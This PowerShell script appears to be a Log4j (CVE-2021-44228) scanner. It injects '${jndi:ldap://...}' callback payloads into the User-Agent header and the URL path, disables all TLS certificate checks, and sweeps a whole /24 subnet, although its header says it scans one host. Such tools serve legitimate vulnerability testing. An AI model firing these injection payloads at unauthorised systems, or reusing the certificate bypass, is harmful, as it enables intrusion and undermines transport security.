# CVE-2021-44228 - Log4j Powershell Checker
#
# Perform a scan of a single host to see if it's
# vulnerable for the above-mentioned CVE.
#
# https://github.com/crypt0jan/log4j-powershell-checker
#
# License: MIT license.
# ______________________________________________

# Suppress warnings
$ErrorActionPreference = "silentlyContinue"

# Change this to your NameServer
# See: https://github.com/NorthwaveSecurity/log4jcheck/blob/main/README.md#setting-up-a-dns-server
$NameServer = "10.191.255.32"

# Enable Proxy
function Scan4Log4j ($Target){
# Check input args
    $id = ([System.Uri]$target).Host -replace '^www\.'
    Write-Host ("Scanning target: {0}" -f $target)


# Override SSL verify to prevent vulnerability checks bouncing on invalid certificates. 
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
            return true;
        }
 }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

# Check 1 (User Agent)
# Inspired by: https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6

Write-Host "-- CHECK 1 --" -ForegroundColor red -BackgroundColor white
Write-Host "Sending request to $target using User-Agent injection..."

$uar = $null
$JsonHeader = @{ 'User-Agent' = '${jndi:ldap://' + $($id) + '-1.' + $($NameServer) + '/test.class}' }
try {
    $uar = Invoke-WebRequest $target -Headers $JsonHeader
}catch {
    $uar = $_.Exception
}

#Write-Host $uar

# Check 2 (Get Request)

Write-Host "-- CHECK 2 --" -ForegroundColor red -BackgroundColor white
Write-Host "Sending request to $target using GET request injection..."

$gr = $null
$GetParam = ('${jndi:ldap://' + $id + '-2.' + $NameServer + '/test.class}')
try {
    $gr = Invoke-WebRequest ( $target + "/" + $GetParam )
}catch {
    $gr = $_.Exception
}

#Write-Host $gr

# CLEAR PROXY
if ($Proxy) {
    [system.net.webrequest]::defaultwebproxy = New-Object System.Net.WebProxy($null)
}

# _______________________
# Now, go to your $NameServer and check file 
# '/var/log/named/query.log' for incoming requests.
# If there is a request, the $target is vulnerable!
}
$a = 1
$z = 254
$a..$z | foreach {
  $ip = "10.191.255.0" -replace "0$",$_
  if(Test-Connection -ComputerName $IP -Count 1 -Quiet){
    Write-host $IP
    Scan4Log4j $ip
    }else{
        write-host FAIL
    }
}

